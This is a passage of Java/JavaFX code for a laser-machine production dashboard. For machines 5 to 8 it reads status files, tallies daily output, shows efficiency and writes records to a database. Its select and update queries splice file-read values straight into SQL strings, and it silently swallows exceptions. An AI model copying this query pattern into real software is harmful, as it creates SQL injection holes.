                vboxpane5.setStyle("-fx-background-color:transparent;");
              
                    
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff14.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff14.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff14.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff14.setText("N/A");
          }
          
              
          }
          
      
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg5.delete();
        }
            
            
            
           workingmachinesno=workingmachinesno+1; 
            
        }
    else { 
        /////////////////////// Machine 5 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno14.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno14.setText("Machine   "+machine_number5);
        nog14.setText("0");
        eff14.setText("0%");
        mod14.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod14.setText("Machine isn't working");
        unit14.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit14.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh14.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
    
    refresh15.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 6 ////////////////////////////
      String machine_number6="6";  
//      String poth6 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth6=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg6=new File (poth+"\\Machine6.kady");
        if (lkg6.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg6));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno15.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod15.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit15.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod15.setText(v5);
           unit15.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine6.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine6.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine6.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine6.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine6.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe6.txt"));
             summe6=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine6.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog15.setText(Integer.toString(sum-summe6));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog15.setText("N/A");
//nog15.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane6.setStyle("-fx-background-color:orange;");
              eff15.setText("0%");
          }
          
          else {
              
                vboxpane6.setStyle("-fx-background-color:transparent;");
              
                     
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff15.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff15.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff15.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff15.setText("N/A");
          }
              
          }
          
     
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg6.delete();
        } 
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 6 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno15.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno15.setText("Machine   "+machine_number6);
        nog15.setText("0");
        eff15.setText("0%");
        mod15.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod15.setText("Machine isn't working");
        unit15.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit15.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh15.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
        
    
    refresh16.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 7 ////////////////////////////
      String machine_number7="7";  
//      String poth7 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth7=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg7=new File (poth+"\\Machine7.kady");
        if (lkg7.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg7));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno16.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod16.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit16.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod16.setText(v5);
           unit16.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine7.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine7.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine7.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine7.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine7.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe7.txt"));
             summe7=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine7.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog16.setText(Integer.toString(sum-summe7));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  
           

//nog16.setText("N/A");
//nog16.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane7.setStyle("-fx-background-color:orange;");
              eff16.setText("0%");
          }
          
          else {
              
                vboxpane7.setStyle("-fx-background-color:transparent;");
              
                   
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff16.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff16.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff16.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff16.setText("N/A");
          }
              
          }
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg7.delete();
        }  
            
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 7 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno16.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno16.setText("Machine   "+machine_number7);
        nog16.setText("0");
        eff16.setText("0%");
        mod16.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod16.setText("Machine isn't working");
        unit16.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit16.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh16.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
//       
    
        
    refresh17.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 8 ////////////////////////////
      String machine_number8="8";  
//      String poth8 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth8=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg8=new File (poth+"\\Machine8.kady");
        if (lkg8.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg8));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno17.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod17.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit17.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod17.setText(v5);
           unit17.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine8.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
          areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine8.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine8.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine8.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine8.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe8.txt"));
             summe8=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine8.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog17.setText(Integer.toString(sum-summe8));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog17.setText("N/A");
//nog17.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
//               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
           long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane8.setStyle("-fx-background-color:orange;");
              eff17.setText("0%");
          }
          
          else {
              
                vboxpane8.setStyle("-fx-background-color:transparent;");
              
                  
          long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff17.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff17.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff17.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff17.setText("N/A");
          }
              
          }
          
        
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg8.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 8 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno17.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno17.setText("Machine   "+machine_number8);
        nog17.setText("0");
        eff17.setText("0%");
        mod17.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
